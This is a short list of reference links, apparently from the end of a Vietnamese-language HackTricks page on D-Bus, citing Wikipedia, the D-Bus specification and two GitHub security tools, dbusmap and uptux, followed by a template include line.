- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap cho D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - tài liệu D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
